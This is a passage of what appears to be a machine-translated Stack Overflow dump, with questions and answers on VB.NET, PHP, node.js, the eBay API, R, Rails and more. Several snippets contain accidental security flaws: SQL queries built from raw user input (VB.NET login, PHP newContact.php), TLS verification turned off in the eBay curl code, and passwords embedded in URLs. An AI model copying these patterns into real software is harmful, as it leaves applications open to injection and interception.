
* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-03-07T03:29:43.223

这里有一些有根据的猜测，但是...

主要是因为“DatePosted”本身没有内在意义。它可以是一个方法、一个属性、一个类型，或者任何东西。它也与 的方法签名不匹配`Func<TSource, TKey>`，但我假设您的意思是“如果编译器更聪明”。

但是，您*可以*传入与签名匹配的内容，如下所示：

```
public class Foo
{
    public int Age {get; set;}
}

public int GetFooAge(Foo f) { return f.Foo; }

var source = <some mess'o Foos>;

source.OrderByDescending(GetFooAge).Dump(); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-03-07T03:27:35.027

我认为关键是这样的功能会给上下文带来干扰。什么是“DatePosted”，它在哪里定义？编译器以某种方式处理方法调用，引入一种特殊的方法调用会很棘手。我们怎么知道这应该是一个特殊的方法调用？为编译器提供所需的所有上下文更加实用。这就是简洁的 lambda 语法如此有用的原因。*

# vb.net - VB.NET 2010：错误“ErrorExecuteReader：连接属性尚未初始化”

> ID：15262478
> 
> 赞同：0
> 
> 时间：2013-03-07T03:18:37.020
> 
> 标签：vb.net, visual-studio-2010, visual-studio

我收到此错误：`"ErrorExecuteReader: Connection property has not been initialized"`

我无法弄清楚问题是什么。

```
Imports System.Boolean
Imports System.Data.SqlClient

Public Class Form1

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim userID As String
        Dim password As String
        Dim conn As SqlConnection
        Dim cmd As SqlCommand
        Dim reader As SqlDataReader

        userID = txtuser.Text
        password = txtpassword.Text
        txtuser.Text = Focus()
        txtpassword.Visible = "False"

        Try
            conn = New SqlConnection("Data Source=XXXXXX;Initial Catalog=XXXXXXUser ID=XXXXXX;Password=XXXXXX")
            cmd = New SqlCommand("Select user,password from userlog where user='" + userID + "' & password='" + password + "'")

            conn.Open()
            reader = cmd.ExecuteReader()

            conn.Close()    

            If (String.Compare(password, 123) = 0) Then
                MsgBox("Success")
            End If
        Catch ex As Exception
            MsgBox("Error" + ex.Message())
        End Try
    End Sub
End Class 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T03:41:27.300

您的命令对象的连接属性尚未设置。像这样将它添加到您的构造函数中：

```
cmd = New SqlCommand("...", conn) 
```

或者像这样设置 Connection 属性：

```
cmd.Connection = conn 
```

顺便说一句，如果您在 Visual Studio 中进行调试，应该很容易发现此错误。

# coffeescript - 如何使用 webstorm 6 源映射在 node.js 中调试咖啡脚本

> ID：15262480
> 
> 赞同：13
> 
> 时间：2013-03-07T03:18:49.937
> 
> 标签：coffeescript, webstorm

我已经设置了这个视频中的咖啡脚本文件观察器

[http://www.youtube.com/watch?v=Sl1Uk3zT5Fg](http://www.youtube.com/watch?v=Sl1Uk3zT5Fg)

这似乎适用于使用 google chrome 调试的 html 项目。但是，当我开始调试并在 node.js 项目的咖啡脚本文件中设置断点时，它没有命中断点。但是，在生成的 js 文件中设置断点确实会受到影响。

我需要做什么才能让调试器使用生成的源映射并在 webstorm 6 中使用 node.js 逐步完成咖啡脚本？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-23T16:56:18.713

正如 WebStorm 所期望的那样，刚刚发布的 CoffeeScript 1.6.2 现在在底部有源映射的注释，因此它现在可以按预期工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-17T19:18:10.397

根据 CrazyCoder 提到的问题，看起来这是 WebStorm 期望在`//@ sourceMappingURL=print.map`生成的 JavaScript 文件底部而不是在咖啡脚本编译器当前放置它的顶部的语句的问题。

在每次保存时手动将该行复制到生成的脚本文件的底部似乎不是一个可行的解决方法，所以我认为我们必须观察[Webstorm 问题](http://youtrack.jetbrains.com/issue/WEB-7091) ，直到它得到解决。

# java - 如何按顺序遍历 LinkedHashMap ({atrivial, isAsked == true}];

> ID：15262486
> 
> 赞同：-3
> 
> 时间：2013-03-07T03:19:22.727
> 
> 标签：java

如何对这个 Java LinkedHashMap 进行中序遍历：

```
LinkedHashMap<String, Integer> map = new LinkedHashMap<String, Integer>();

ArrayList<String> fields = new ArrayList<String>();
for (String key: map.________)
  fields.add(key); 
```

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:24:21.170

您不需要循环：只需调用

```
List<String> fields = new ArrayList<String>(map.keySet()); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T03:20:14.590

`map.keySet()`可能是您正在寻找的。

来自[LinkedHashMap的文档](http://docs.oracle.com/javase/6/docs/api/java/util/LinkedHashMap.html)

> 这个链表定义了迭代顺序，通常是键插入映射的顺序（插入顺序）。

所以**YES**，它确实保持插入顺序，即使在您输入**百万**个键之后也是如此。

# node.js - 是否可以向 node.js 中的域发出经过身份验证的请求？

> ID：15262488
> 
> 赞同：0
> 
> 时间：2013-03-07T03:19:24.527
> 
> 标签：node.js, session, cookies, express, httprequest

我正在使用 node.js 和 request.js 模块来发出经过身份验证的 https 请求，就像这样。

```
username = req.body.username;
password = req.body.password;
var url = 'https://' + username + ':' + password + '@domain.com';
request({
    url : url,
}, function (error, response, body){
  //do something here
}); 
```

是否有另一种方法可以做到这一点，而无需 node.js 服务器在不以纯文本形式公开密码的情况下进行此调用？

例如，假设我访问了[http://domain.com](http://domain.com)并使用我的凭据登录。然后我可以关闭我的浏览器，重新访问[http://domain.com](http://domain.com)并自动登录。然后我可以访问我的 node.js 应用程序 (localhost:3000) 并使用节点应用程序发出后续请求，而无需明确重新输入我的密码吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:57:16.457

不，您不能使用浏览器中的 cookie 登录 node。但是您可以像这样使用节点进行身份验证：[如果有基本授权，如何在 Node.js 中使用 http.client](https://stackoverflow.com/questions/3905126/how-to-use-http-client-in-node-js-if-there-is-basic-authorization)

# java - 使 GWT 与 Errai 总线一起工作所需的基本设置是什么

> ID：15262489
> 
> 赞同：0
> 
> 时间：2013-03-07T03:19:27.180
> 
> 标签：java, gwt, errai

我收到此错误：

```
HTTP ERROR: 503

SERVICE_UNAVAILABLE
RequestURI=/index.jsp

Powered by jetty:// 
```

将此添加到 web.xml 时：

```
<servlet>
    <servlet-name>ErraiServlet</servlet-name>
    <servlet-class>org.jboss.errai.bus.server.servlet.DefaultBlockingServlet</servlet-class>
    <load-on-startup>1</load-on-startup>
</servlet>

<servlet-mapping>
    <servlet-name>ErraiServlet</servlet-name>
    <url-pattern>*.erraiBus</url-pattern>
</servlet-mapping>

<context-param>
    <param-name>errai.properties</param-name>
    <param-value>/WEB-INF/errai.properties</param-value>
</context-param> 
```

删除此设置后，我的 Errai gwt 应用程序工作正常，除了它在客户端上显示 Errai 总线错误，但是我需要使 Errai 总线工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T05:12:38.230

我希望这对你有帮助

[视频-gwt-and-erai-ui-quickstart](http://ocpsoft.org/jboss/video-gwt-and-errai-ui-quickstart/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:24:04.833

您可以下载 Jboss forge（像 spring roo 一样工作）并使用 errai 插件，或者您可以使用 maven，并通过 erai 原型构建一个基本的 erai 项目。

# linux - tsc 的 SO_TIMESTAMP 不是 timeval？

> ID：15262492
> 
> 赞同：3
> 
> 时间：2013-03-07T03:20:09.253
> 
> 标签：linux, sockets, network-programming

[从套接字手册页](http://linux.die.net/man/7/socket)中可以看出，可以使用`SO_TIMESTAMP`with`setsockopt`来测量 Linux 内核将接收到的网络数据包交给用户空间所花费的时间。

这里有一个很好的描述这个功能：[测量内核和用户空间之间的 Linux 网络堆栈的延迟](http://vilimpoc.org/research/ku-latency/)。

有没有办法在内核收到数据包时读取`tsc`而不是读取？`timeval`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:47:32.593

不。

*   它是特定于平台的。
*   TSC 可以在某些（P4 时代）处理器上改变频率，并且在历史上没有在内核之间同步（一些现代 CPU 在同一封装中的内核之间进行同步）。
*   理想情况下，无论如何您都希望数据包由网卡加上时间戳；[PTP](http://en.wikipedia.org/wiki/Precision_Time_Protocol)通常需要这样才能实现其目标精度。

您可以合理要求的最多是`struct timespec`时`CLOCK_MONOTONIC`基。我不认为它存在，但添加它不会太难。

# c# - 从字符串转换为日期时间

> ID：15262494
> 
> 赞同：-5
> 
> 时间：2013-03-07T03:20:16.423
> 
> 标签：c#

首先，我有一个 xamdatetimeeditor 供用户选择日期和时间。格式为“yyyy/MM/dd HH:mm:ss”。从那里，我想将其转换为“yyyyMMddHHmmss”格式。这意味着只需删除特殊字符和空格。

我必须使用 DateTime.TryParseExact 方法吗？还是我必须使用字符串替换功能？什么是最好的解决方案？

**找到解决方案！！**只需使用字符串格式 = "yyyyMMddHHmmss"; 和 date = getdate.ToString(format);

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:26:15.230

尝试这个：

```
var input = "2004/01/02 12:01:03";
DateTime aDate;
DateTime.TryParse(input, out aDate);
string output = aDate.ToString("yyyyMMddHHmmss"); 
```

# r - 在R中具有多个测试条件的if else问题

> ID：15262496
> 
> 赞同：1
> 
> 时间：2013-03-07T03:20:35.077
> 
> 标签：r, if-statement

我有一个简化如下的数据框（“每日”）：

日点
1 1
1 2
1 3
1 4
1 5
1 6

我想要一个新列，治疗，其元素应该是因素“环境”（点 2、3、6）和“升高”（点 1、4、5）。我试过这个：

```
daily$treatment<- factor(ifelse(daily$ring==c("1","4","5"), "elevated", "ambient")) 
```

但它返回了这个警告，结果不是我需要的：警告消息：1：在 is.na(e1) | is.na(e2) : 较长的对象长度不是较短对象长度的倍数 2: In `==.default`(daily$ring, c("1", "4", "5")) : 较长的对象长度不是更短的对象长度或者我也尝试过，但没有：

```
if (daily$ring==1 | daily$ring==4 | daily$ring==5){
   daily$treatment <- "elevated"
 } else {
   daily$treatment <- "ambient"
 } 
```

我究竟做错了什么？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:24:36.103

```
daily$treatment <- factor(ifelse(daily$Spot %in% c(1,4,5), "elevated", "ambient"))

daily
##   Day Spot treatment
## 1   1    1  elevated
## 2   1    2   ambient
## 3   1    3   ambient
## 4   1    4  elevated
## 5   1    5  elevated
## 6   1    6   ambient 
```

# javascript - Rails 通过“阅读更多”切换截断

> ID：15262503
> 
> 赞同：12
> 
> 时间：2013-03-07T03:21:33.047
> 
> 标签：javascript, jquery, ruby-on-rails, ruby-on-rails-3, truncate

我有一个段落，我想通过单击“阅读更多”的选项来截断它，并让它与其余内容一起滑动打开。内容来自数据库字段。这是我截断的内容：

```
<%= truncate(@major.glance, :length => 250, :omission => '... Read More')%> 
```

我似乎无法找到一种方法来处理从数据库中提取的数据。我看到很多使用全文的例子，你想隐藏在一个单独的 div 标签中的文本。但是，由于此内容来自数据库并且是动态的，因此我找不到有关如何执行此操作的任何信息。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2013-03-07T03:31:06.927

您可以尝试以下方法

```
<div>
  <% if @major.glance.length > 250 %>
    <%= link_to_function truncate(@major.glance, length: 250), "$(this).parent().html('#{escape_javascript @major.glance}')" %>
  <% else %>
    <%= @major.glance %>
  <% end %>
</div> 
```

或者如果您更喜欢使用`Read more`链接

```
<div>
  <% if @major.glance.length > 250 %>
    <%= truncate(@major.glance, length: 250) %>
    <%= link_to_function '...Read more', "$(this).parent().html('#{escape_javascript @major.glance}')" %>
  <% else %>
    <%= @major.glance %>
  <% end %>
<div> 
```

**更新**

由于在 Rails 4 中`link_to_function`已弃用，建议使用非干扰的 js，请使用以下内容

```
<div>
  <% if @major.glance.length > 250 %>
    <%= truncate(@major.glance, length: 250) %>
    <%= link_to '...Read more', '', class: "read-more-#{@major.id}" %>
    <script>
      $('.read-more-<%= @major.id %>').on('click', function(e) {
        e.preventDefault()
        $(this).parent().html('<%= escape_javascript @major.glance %>')
      })
    </script>
  <% else %>
    <%= @major.glance %>
  <% end %>
<div> 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-10-06T01:01:07.110

我知道我加入这个对话有点晚了。我一直在解决同样的问题，尝试了上面的解决方案，效果很好。但是，已隐藏的 SEO 明智内容并未被搜索引擎索引。我也签入了[Lynx](http://habilis.net/lynxlet/)，但链接无法访问（显然）。[因此， Jed Foster](http://jedfoster.com/Readmore.js/)选择了这个解决方案| [readmore.js](http://jedfoster.com/Readmore.js/) - lynx 可以正确读取它，现在我正在等待 SE 索引更新，看看我是否可以在搜索结果中找到自己。以防万一有人遇到类似情况...

# css - //@sourceURL 等效于 CSS

> ID：15262506
> 
> 赞同：1
> 
> 时间：2013-03-07T03:21:48.557
> 
> 标签：css, debugging, firebug

在 Firebug 中，[`//@ sourceURL`](http://blog.getfirebug.com/2009/08/11/give-your-eval-a-name-with-sourceurl/)可以在 Javascript 中使用`eval`。我们可以使用这种技术将多个 Javascript 文件连接到一个文件中，并且仍然让它们在 devtools/Firebug 中显示为单独的文件，如下所示：

```
eval("... foo.js contents ...\n//@ sourceURL=foo.js");
eval("... bar.js contents ...\n//@ sourceURL=bar.js"); 
```

CSS文件有类似的技术吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-07-09T08:18:22.837

在 CSS 中正确的 API 是使用

```
/*# sourceMappingURL=<url> */ 
```

之前提出的格式如下所示尚未被所有浏览器采用

```
/*# sourceMap=<url> */ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T18:10:56.780

在没有更好的想法的情况下，也*可以*使用[Sass sourcemaps](http://bricss.net/post/33788072565/using-sass-source-maps-in-webkit-inspector)来实现类似的效果。这似乎是一个 hack，但也许这是一个开始。

感谢 Andy Matthews 的指点。

# powershell - gwmi win32_logicaldisk -filter "DeviceType=3"...为什么无效查询？

> ID：15262507
> 
> 赞同：1
> 
> 时间：2013-03-07T03:22:16.840
> 
> 标签：powershell

不好意思新手请教一个新手的问​​题：）简单代码：

```
gwmi win32_logicaldisk -filter "DeviceType=3" 
```

为什么查询无效？我想这是因为我不熟悉这个过滤器，有没有关于这个过滤器的好页面我可以阅读？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:27:04.453

它不是 DeviceType 而是 DriveType（或者可能是 DeviceID）。您可以查看[文档](http://msdn.microsoft.com/en-us/library/windows/desktop/aa394173.aspx)以查看可用的属性，或者简单地通过管道获取成员：

```
PS C:\> $drive = get-wmiobject Win32_LogicalDisk
PS C:\> $drive | get-member
... 
```

账单

# heroku - 我需要为 Heroku Postgre Followers 和/或 Forks 付费吗？

> ID：15262508
> 
> 赞同：4
> 
> 时间：2013-03-07T03:22:20.440
> 
> 标签：heroku

我刚刚将我的数据库移动到 Heroku Postgre Crane 生产计划，我想创建分叉和追随者。我的问题是，这些是免费功能还是我需要为分叉和追随者数据库付费？

我无法找到任何关于此的文档，因此任何指针都将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T04:05:35.197

您必须为您创建的所有数据库付费，但请注意，它们不必都在同一个计划中。与 dynos 一样，成本按您添加数据库的每秒按比例分配。详细信息：[https ://postgres.heroku.com/pricing](https://postgres.heroku.com/pricing)

# jquery - 如何检测在 jQuery 中使用 webkit 的浏览器的空闲状态

> ID：15262511
> 
> 赞同：0
> 
> 时间：2013-03-07T03:22:33.320
> 
> 标签：jquery

我发现一个解决方案可以在[Detecting if the user is idle with JavaScript and YUI 3](http://www.nczonline.net/blog/2009/06/02/detecting-if-the-user-is-idle-with-javascript-and-yui-3/)上检测浏览器上用户的空闲状态。

它在 FireFox 上运行良好，但有时在 Chrome、Safari 上却不行。那些浏览器一直调用 mousemove 事件。

任何人都有其他解决方案吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:32:34.580

我现在找到了解决方案。在 idle-timer.js 中，我将其更新如下 1/ 搜索以下代码

```
var idle    = false,        //indicates if the user is idle
        tId     = -1,           //timeout ID
        enabled = false,        //indicates if the idle timer is enabled
        timeout = 30000;        //the amount of time (ms) before the user is considered idle 
```

并在上面的下一个添加以下两条线

```
prevMousePos = { x: -1, y: -1 };
        currentMousePos = { x: -1, y: -1 }; 
```

如果您的代码不起作用，您可以尝试使用 event.screenX、event.screenY。

2/ 替换这一行

```
clearTimeout(tId); 
```

和

```
if(e.type == 'mousemove'){
            currentMousePos.x = event.pageX;
            currentMousePos.y = event.pageY;
            if(currentMousePos == prevMousePos){
                enabled = false;
            }
            else{
                prevMousePos = currentMousePos;
                clearTimeout(tId);
            }
        }
        else if(e.type == 'mousemove'){
            clearTimeout(tId);
        }

    else if(e.type == 'keydown'){
        clearTimeout(tId);
    } 
```

# ebay-api - 易趣 API。使用送货详情过滤“等待邮资” 或“未发货”订单

> ID：15262513
> 
> 赞同：2
> 
> 时间：2013-03-07T03:22:45.703
> 
> 标签：ebay-api

花了无数时间挖掘 eBay API 文档，却找不到任何东西。

在卖家账户上，我需要获取状态为“等待邮资”​​或“未发货”的所有订单的列表。因此，我可以获得当前“未发货”的所有订单的 XML 报告，其中包含有关客户的完整详细信息（送货地址、使用的邮资方式等）

[GetOrders](http://developer.ebay.com/DevZone/XML/docs/Reference/eBay/GetOrders.html)不提供未发货订单的过滤器。
[GetSellingManagerSoldListings](http://developer.ebay.com/DevZone/XML/docs/Reference/eBay/GetSellingManagerSoldListings.html)具有此类功能，但不提供有关客户运输详细信息的任何详细信息。

有人遇到过这样的问题吗？

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-12-12T14:05:55.543

GetOrders 不为 Unshipped 订单提供过滤器..但是如果有 [ShippedTime] 的对象响应您的 GetOrders 请求，这意味着订单是为未发货的物品发货的，您将不会得到 [ShippedTime] 的对象...在此基地可以查询未发货订单

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-07T09:39:36.960

这段代码对我有用，希望你觉得它有用

```
 date_default_timezone_set('Europe/London');
 $page = 0;
 $order_count = 0;
 $shipped_count = 0;
 do
 {
     $page++;

    $feed = <<< EOD
<?xml version="1.0" encoding="utf-8"?>
<GetOrdersRequest xmlns="urn:ebay:apis:eBLBaseComponents">
<RequesterCredentials>
<eBayAuthToken>$auth_token</eBayAuthToken>
</RequesterCredentials>
<OrderRole>Seller</OrderRole>
<OrderStatus>Completed</OrderStatus>
<Pagination>
<EntriesPerPage>100</EntriesPerPage>
<PageNumber>$page</PageNumber>
</Pagination>
<NumberOfDays>7</NumberOfDays>
<ErrorLanguage>en_GB</ErrorLanguage>
<Version>823</Version>
<WarningLevel>High</WarningLevel>
</GetOrdersRequest>?
EOD;

$feed = trim($feed);
     $site_id = 3;//3 For UK
     $call_name = 'GetOrders';
     $headers = array
         (
         'X-EBAY-API-COMPATIBILITY-LEVEL: ' . $compat_level,
         'X-EBAY-API-DEV-NAME: ' . $dev_id,
         'X-EBAY-API-APP-NAME: ' . $app_id,
         'X-EBAY-API-CERT-NAME: ' . $cert_id,
         'X-EBAY-API-CALL-NAME: ' . $call_name,
         'X-EBAY-API-SITEID: ' . $site_id,
     );

     // Send request to eBay and load response in $response
     $connection = curl_init();
     curl_setopt($connection, CURLOPT_URL, $api_endpoint);
     curl_setopt($connection, CURLOPT_SSL_VERIFYPEER, 0);
     curl_setopt($connection, CURLOPT_SSL_VERIFYHOST, 0);
     curl_setopt($connection, CURLOPT_HTTPHEADER, $headers);
     curl_setopt($connection, CURLOPT_POST, 1);
     curl_setopt($connection, CURLOPT_POSTFIELDS, $feed);
     curl_setopt($connection, CURLOPT_RETURNTRANSFER, 1);
     $response = curl_exec($connection);
     curl_close($connection);

     $order_count += substr_count($response, "<Order>");
     $shipped_count += substr_count($response, "<ShippedTime>");
 }
 while(stristr($response, "<HasMoreOrders>true</HasMoreOrders>") != FALSE OR stristr($response, "<HasMoreOrders>true</HasMoreOrders>") != 0);
 $unshipped_orders = $order_count - $shipped_count; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-12-28T12:45:12.090

好吧，我通过使用 php 的参数得到了要发货的订单。

```
$xmlReq = '<?xml version="1.0" encoding="utf-8"?>';
$xmlReq .= '<GetSellingManagerSoldListingsRequest xmlns="urn:ebay:apis:eBLBaseComponents">';
$xmlReq .= '<UserID>'.$YOUR_EBAY_APP_ID.'</UserID>';
$xmlReq .= '<Filter>PaidNotShipped</Filter>';
$xmlReq .= '<Pagination><EntriesPerPage>200</EntriesPerPage><PageNumber>1</PageNumber></Pagination>';
$xmlReq .= '<ErrorLanguage>en_US</ErrorLanguage>';
$xmlReq .= "<Version>$version</Version>";
$xmlReq .= '<WarningLevel>Low</WarningLevel>';
$xmlReq .= "<RequesterCredentials><eBayAuthToken>$YOUR_AUTH_TOKEN</eBayAuthToken></RequesterCredentials>\n";    
$xmlReq .= '</GetSellingManagerSoldListingsRequest>'; 
```

我希望你得到了过滤参数“PaidNoTShipped”。您将在此响应中获得一个 order_line_item_id 并使用它只需使用此订单行项目 ID GetOrderTransactions 再次调用，您将获得其余信息。在 GetOrderTransactions 中使用`<DetailLevel>ReturnAll</DetailLevel>`以获得扩展结果。如果您想了解更多有关 api 调用的信息，请告诉我。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-04-14T21:49:33.863

GetOrders 有`RequiredSellerAction`标签，显示卖家必须采取的下一步行动。

对于未发货的订单，它是 ' `MarkAsShipped`'

```
<PaymentHoldDetails>
<ExpectedReleaseDate>2018-04-20T07:00:00.000Z</ExpectedReleaseDate>
<RequiredSellerActionArray>
<RequiredSellerAction>MarkAsShipped</RequiredSellerAction>
</RequiredSellerActionArray>
<NumOfReqSellerActions>1</NumOfReqSellerActions>
<PaymentHoldReason>CasualSeller on https://www.aihello.com </PaymentHoldReason>
</PaymentHoldDetails> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-12-20T20:29:48.087

在相当长的一段时间内，我一直在寻找这个问题的解决方案。这是一个非常古老的问题，但我希望它有一个更直接的答案。会为我节省几个小时。@Moazam 有正确的想法，但确实缺乏特异性，所以就这样吧。以下答案是用 python 编写的，基于/使用[eBay 的 Api](https://github.com/timotheus/ebaysdk-python)。（你会认为这会**更**容易找到/做）

```
from ebaysdk.trading import Connection as Trading
from ebaysdk.exception import ConnectionError
import bs4 as bs # beautifulsoup import for parsing xml

try:
    api = Trading(config_file="ebay.yaml") #put ur eBay dev API credentials in yaml file
    response = api.execute('GetSellerTransactions', {}) # dictionary response
    dommy = response.content 

except ConnectionError as e: # spit error if can't connect (ie: wrong api credz)
    print(e)
    print(e.response.dict())

soup = bs.BeautifulSoup(dommy, 'lxml') # parse the API response as xml
tArray = soup.transactionarray 

with open('fullSoldLogXML.xml', 'w+') as xml: # Log file, not required.
    xml.write(str(soup)) # write entire ebay response to log file.

with open('singleTransactions.xml', 'w+') as tranXml: # Another log. Personal reference.
    tranXml.write(str(tArray)) # parse all transactions from transactionarray in xml 

for each in tArray: # tArray is every transaction, in transactionarray)
    print each.shippedtime # print shipped time, if None then hasn't been shipped. 
```

应该输出如下内容：

```
<shippedtime>2016-12-18T15:12:22.000Z</shippedtime>
<shippedtime>2016-12-20T00:35:43.000Z</shippedtime>
<shippedtime>2016-12-20T01:50:37.000Z</shippedtime>
None 
```

有了这些信息，您可以`try/except`对每个事务进行循环。`If shippedtime == None`，然后您可以剖析订单并获取有用的信息，例如`print each.shippingaddress, each.orderlineitemid, each.paidtime`等...

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-03-04T14:33:00.887

这是我的“hacky”方式：

```
try
{
$ShippedTime = $order->ShippedTime;
if($ShippedTime && isset($ShippedTime))
$ShippedTime = $ShippedTime->format('d-m-Y H:i:s');
else
$ShippedTime = 'awaiting dispatch'; 
}
catch(Exception $e)
{
 $ShippedTime = 'awaiting dispatch'; 
} 
```

# php - 为什么我的单选按钮组没有正确添加到我的数据库中？

> ID：15262515
> 
> 赞同：1
> 
> 时间：2013-03-07T03:22:56.420
> 
> 标签：php, ajax, database, button, radio

在我的应用程序中，我有一个名为 Contacts.html 的索引页面。我有一个名为 newContactForm.php 的表单，我通过 ajax 函数将其显示在 Contacts.html 页面上。当用户在表单中输入详细信息并按下提交时，它使用表单操作将数据发送到名为 insert 的 ajax 函数。插入函数获取数据并将其发送到 newContact.php，它将数据保存到我的数据库表中。然后插入函数 (onreadystatechange) 触发一个名为 showGroup 的 ajax 函数，该函数在 Contacts.html 页面上显示数据库中的所有联系人。

我的问题是我的单选按钮值始终输入为“on”，而不是应为的值（即同事或家人等...等...）。我的与此问题相关的页面代码如下。我试图自己解决这个问题，但找不到问题。

我的ajax函数：

```
 function createObject() 
{
    var request_type;
    var browser = navigator.appName;
    if(browser == "Microsoft Internet Explorer")
    {
        request_type = new ActiveXObject("Microsoft.XMLHTTP");
    }

    else    
    {
        request_type = new XMLHttpRequest();
    }

    return request_type;
}

var http = createObject();

//value used to solve an Internet Explorer cache issue
var nocache = 0;
function insert() 
{
    // Required: verify that all fileds is not empty. Use encodeURI() to solve some issues about character encoding.
    var newFname= encodeURI(document.getElementById('newFname').value);
    var newLname = encodeURI(document.getElementById('newLname').value);
    var newPhone = encodeURI(document.getElementById('newPhone').value);
    var newEmail = encodeURI(document.getElementById('newEmail').value);
    var newAddress = encodeURI(document.getElementById('newAddress').value);
    var group = encodeURI(document.getElementById('group').value);

    // Set te random number to add to URL request
    nocache = Math.random();
    // Pass the login variables like URL variable
    http.open('get', 'newContact.php?newFname='+newFname+'&newLname=' +newLname+'&newPhone=' +newPhone+'&newEmail=' +newEmail+'&newAddress=' +newAddress+'&group=' +group+'&nocache = '+nocache);
    http.onreadystatechange = showGroup;
    http.send(null);
    }

function showGroup(str)
    {
    document.getElementById("content01").innerHTML="";
    if (str=="")
    {
    document.getElementById("content01").innerHTML="";
    return;
    } 
    if (window.XMLHttpRequest)
    {// code for IE7+, Firefox, Chrome, Opera, Safari
    xmlhttp=new XMLHttpRequest();
    }
    else
    {// code for IE6, IE5
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.onreadystatechange=function()
    {
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    document.getElementById("content01").innerHTML=xmlhttp.responseText;
    document.getElementById("content02").innerHTML = "";
    }
    }
    xmlhttp.open("GET","getGroup.php?contactGroup="+str,true);
    xmlhttp.send();
    } 
```

我的 newContact.php 文件：

```
 <!-- Include Database connections info. -->
<?php include('config.php'); ?>

<?php

//If the values are set (i.e the txt fields/radio button are filled in then run the sql insert statement to add the contact.
if(isset($_GET['newFname']) && isset($_GET['newLname']) && isset($_GET['newPhone']) && isset($_GET['newEmail']) && isset($_GET['newAddress']) && isset($_GET['group'])) 
{

    $newFname = $_GET["newFname"] ;
    $newLname = $_GET["newLname"] ;
    $newPhone = $_GET["newPhone"] ;
    $newEmail = $_GET["newEmail"] ;
    $newAddress = $_GET["newAddress"] ;
    $group = $_GET["group"] ;

    //SQL insert statement used to add the user entered data to the database table.
    $insertContact_sql = "INSERT INTO `test`.`contacts` (`newFname`, `newLname`, `newPhone`, `newEmail`, `newAddress`, `group`) VALUES ('{$newFname}' , '{$newLname}' , '{$newPhone}' , '{$newEmail}' , '{$newAddress}' , '{$group}')";
    $insertContact= mysql_query($insertContact_sql) or die(mysql_error());

} 

//else if the fields do not contain data then display this error message.
else 
{ 
    echo 'Error! Please fill all fileds!';
}

?> 
```

我的 newContactForm.php 文件：

```
 <!--This line of code is used to direct the "form action='javascript:insert()' to the 'insert' function located in the mentioned .js file"-->
<script src="ajax_framework.js" language="javascript"></script>

<?php   $addContact = $_GET['addContact']; //index which sends new contact form to the html page via ajax function "showAddContact" which is located in the ajax.js file.

//form which users can use to enter the details of a new contact to add to the database.
echo "Add A Contact:";
echo "<FORM action='javascript:insert()' method='get'>";
echo "<table>";
echo "<tr>";
echo "<td>First Name:</td><td><input id='newFname' name='newFname' type='text' size'20'></input></td>";
echo "</tr>";
echo "<tr>";
echo "<td>Last Name:</td><td><input id='newLname' name='newLname' type='text' size'20'></input></td>";
echo "</tr>";
echo "<tr>";
echo "<td>Phone Number:</td><td><input id='newPhone' name='newPhone' type='text' size'12'></input></td>";
echo "</tr>";
echo "<td>Email Address:</td><td><input id='newEmail' name='newEmail' type='text' size'30'></input></td>";
echo "</tr>";
echo "<tr>";
echo "<td>Postal Address:</td><td><input id='newAddress' name='newAddress' type='text' size'65'></input></td>";
echo "</tr>";
echo "<td>Group:</td><td> <input id='group' type='radio' name='group'/>No Group <input id='group' type='radio' name='group'/>Friend";
echo "<input id='group' type='radio' name='group'/>Colleagues <input id='group' type='radio' name='group'/>Family";
echo "</table>";
//submit button that submits the contact information to an ajax function.
echo "<input type='submit' name='Submit' value='Add Contact'/>";
echo "</FORM>";

?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:26:05.693

您的任何单选按钮都没有价值。添加`value`属性：

```
<input id='group' type='radio' name='group' value='No Group'/>No Group
<input id='group' type='radio' name='group' value='Friend'/>Friend
<input id='group' type='radio' name='group' value='Colleagues'/>Colleagues
<input id='group' type='radio' name='group' value='Family'/>Family 
```

# javascript - jquery如何删除ui-state-hover

> ID：15262518
> 
> 赞同：4
> 
> 时间：2013-03-07T03:23:07.063
> 
> 标签：javascript, jquery, jquery-ui

我使用 jquery 代码：

```
<script type="text/javascript">
  $("#dform").dialog({
    autoOpen: false,
    modal: true,
    buttons: {
      'Submit': {
        text : "Submit",
        class : "gbutton",
        click: function () {
          ...
        }
      },
      'Cancel': {
        text : 'Cancel',
        class : 'gbutton',
        click: function () {
          ...
        }
      }
    }
  });

  $("a")
    .click(function(event) {
        $("#dform").dialog("open");
        $('button').removeClass("ui-button");
        $('button').removeClass("ui-widget");
